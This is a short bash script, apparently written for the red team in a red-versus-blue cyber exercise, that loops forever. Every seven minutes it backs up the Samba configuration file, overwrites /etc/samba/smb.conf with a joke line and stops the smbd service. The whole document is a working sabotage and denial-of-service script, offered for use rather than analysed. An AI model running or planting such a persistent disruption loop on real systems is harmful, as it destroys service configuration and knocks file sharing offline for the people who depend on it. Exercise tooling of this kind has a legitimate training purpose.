#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
   cp '/etc/samba/smb.conf' '/etc/red.conf'
   echo "I'm Batman" > '/etc/samba/smb.conf'
 else
   cp '/etc/samba/smb.conf' '/home/red.conf'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/samba/smb.conf'
 fi

 sudo service smbd stop
done
